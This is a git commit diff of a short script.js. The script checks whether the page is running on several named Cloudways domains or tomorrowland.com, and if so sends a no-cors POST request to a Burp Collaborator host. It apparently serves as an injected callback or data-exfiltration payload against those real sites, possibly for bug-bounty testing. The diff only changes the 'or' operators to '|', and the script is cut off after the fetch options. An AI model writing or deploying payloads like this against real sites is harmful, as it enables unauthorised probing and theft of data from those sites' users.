0aa0f0303dd77abb3b739e44dc01b775161127be
hostfree23434 <46051776+hostfree23434@users.noreply.github.com>
2022-11-30 20:31:01 +0330

    Update script.js

--- script.js
+++ script.js
@@ -1,4 +1,4 @@
-if (document.domain == "platform.cloudways.com" or document.domain == "www.cloudways.com" or document.domain == "api.cloudways.com" or document.domain == "developers.cloudways.com" or document.domain == " www.tomorrowland.com ") {
+if (document.domain == "platform.cloudways.com" | document.domain == "www.cloudways.com" | document.domain == "api.cloudways.com" | document.domain == "developers.cloudways.com" | document.domain == " www.tomorrowland.com ") {
   fetch('https://b5htwifvqnphcg2tb08njkx0rrxil7.burpcollaborator.net', {
   method: 'POST',
   mode: 'no-cors',
